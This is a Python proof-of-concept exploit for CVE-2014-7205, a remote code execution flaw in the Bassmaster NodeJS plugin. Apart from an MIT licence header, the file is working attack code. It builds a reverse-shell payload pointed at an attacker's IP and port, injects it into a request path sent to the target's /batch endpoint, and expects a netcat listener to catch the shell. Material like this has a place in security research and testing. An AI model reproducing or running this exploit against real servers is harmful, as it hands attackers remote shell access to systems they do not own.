#!/usr/bin/env python3

#################################################################################
#                **-- Bassmaster NodeJS Plugin RCE PoC --**                     #
#                                                                               #
# A python script to exploit CVE-2014-7205 on a NodeJS server running           #
# Bassmaster plugin ver <= 1.5.1                                                #
# ex:bassmaster-rce.py -u http://example.com -p 8080 -l 192.168.1.100 -P 4444   #
#                                                                               #
# Copyright (c) 2021 Andrew Trube  <trube510@protonmail.com>                    #
#                                                                               #
# Permission is hereby granted, free of charge, to any person obtaining a copy  #
# of this software and associated documentation files (the "Software"), to deal #
# in the Software without restriction, including without limitation the rights  #
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell     #
# copies of the Software, and to permit persons to whom the Software is         #
# furnished to do so, subject to the following conditions:                      #
#                                                                               #
# The above copyright notice and this permission notice shall be included in all#
# copies or substantial portions of the Software.                               #
#                                                                               #                                              
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR    #
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,      #
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE   #
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER        #
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, #
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE #
# SOFTWARE.                                                                     #
#                                                                               #
#################################################################################


import sys,requests,argparse,json,re
from nodeshell import nodeRevShell as revshell

def main(URL,PORT,LHOST,LPORT):
  #use the nodeshell module to generate a reverse shell
  rsh = revshell(LHOST,LPORT)
  pay = rsh.generate_shell()
  
  #sends the payload   
  post_data = { "requests": [{ "method": "get", "path": "/profile" }, { "method": "get", "path": "/item" }, { "method": "get", "path": "/item/$1.id;{};".format(pay[0]) }] }
  target = "{}:{}/batch".format(re.sub(r'/$',"",URL),PORT)
 
  resp = requests.post(target,data=json.dumps(post_data),headers={'Content-Type':'application/json'})

  if resp.status_code != 200:
    print("\nSomething went wrong\n")
  else:
    print("[+] Finished [+]")
    
    
if __name__ == "__main__":
  p = argparse.ArgumentParser()

  p.add_argument('-u','--url',metavar='URL',required=True, help="Target host's URL")
  p.add_argument('-p','--port',metavar='RPORT',required=False, default=8080, help="Target host's port which Bassmaster is running on")
  p.add_argument('-l', '--lhost',metavar='LHOST' ,required=True, help="Attacker's IP")
  p.add_argument('-P', '--lport',metavar='LPORT',required=True, help="Attacker's PORT which has a netcat listener bound")

  args = p.parse_args()
  main(args.url,args.port,args.lhost,args.lport)
